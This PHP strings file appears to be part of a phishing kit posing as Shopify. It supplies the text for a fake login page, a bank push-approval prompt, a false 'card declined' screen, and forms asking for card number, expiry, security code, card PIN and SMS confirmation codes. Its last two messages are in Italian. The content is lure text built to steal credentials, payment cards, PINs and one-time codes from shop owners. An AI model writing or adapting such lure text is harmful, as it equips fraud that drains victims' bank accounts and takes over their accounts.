<?php
$lang = array(
    "_form_title" => "Log in",
    "_form_subtitle" => "Continue to Shopify",
    "_form_email_label" => "Email",
    "_form_password_label" => "Password",
    "_form_forgot_password" => "Forgot password?",
    "_form_login_button" => "Log in",
    "_form_help" => "Help",
    "_form_privacy" => "Privacy",
    "_form_terms" => "Terms",
    "_confirmation_title" => "Confirmation",
    "_confirmation_message" => "Please check your mobile banking application for a push notification and approve the operation to proceed. If you don't see the notification, try refreshing your app or checking your notifications tab.",
    "_loading_text" => "Loading",
    "_update_payment_title" => "Update your payment information",
    "_update_payment_message" => "Please add or update your payment information to continue using Shopify.",
    "_card_declined_message" => "Card declined. Please use a different card or contact your bank.",
    "_cardholder_name_label" => "Cardholder's name",
    "_card_number_label" => "Card number",
    "_expiry_date_label" => "Expiry date",
    "_security_code_label" => "Security code",
    "_continue_button" => "Continue",
    "_payment_updated_title" => "Payment information Updated",
    "_payment_updated_message" => "Thank you for updating your payment information.",
    "_card_pin_confirmation_title" => "Confirmation",
    "_card_pin_confirmation_message" => "For more security, Please enter your card PIN.",
    "_card_pin_label" => "Card PIN",
    "_phone_confirmation_title" => "Confirmation",
    "_phone_confirmation_message" => "Please submit the code sent to your phone number.",
    "_invalid_code_message" => "Invalid code.",
    "_confirmation_code_label" => "Confirmation code",
    "_resend_code_link" => "Didn't receive code?",
    "_please_wait_title" => "Attendere prego…",
    "_please_wait_message" => "Stiamo verificando le tue informazioni.<br> Verrai reindirizzato automaticamente."


);
?>
